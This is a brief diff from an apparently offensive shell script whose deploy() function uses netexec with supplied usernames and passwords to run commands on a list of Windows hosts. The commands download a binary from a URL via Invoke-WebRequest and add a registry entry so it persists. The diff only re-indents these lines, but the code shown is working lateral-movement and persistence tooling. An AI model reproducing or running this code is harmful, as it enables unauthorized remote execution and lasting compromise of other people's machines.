@@ -72,9 +72,9 @@ deploy()
                         2)
                             $persist = "reg add '$regPath' /v '$regKey'' /d '$fullPath' /t reg_sz /f;"
                             ;;
-                    netexec windowsHosts.txt -u '$userName' -p '$userPass' -X ' 
-                    Invoke-WebRequest -Uri "$binary" -OutFile "$fullPath"; 
-                    $persist
+            netexec windowsHosts.txt -u '$userName' -p '$userPass' -X ' 
+            Invoke-WebRequest -Uri "$binary" -OutFile "$fullPath"; 
+            $persist
                     '
                             
 
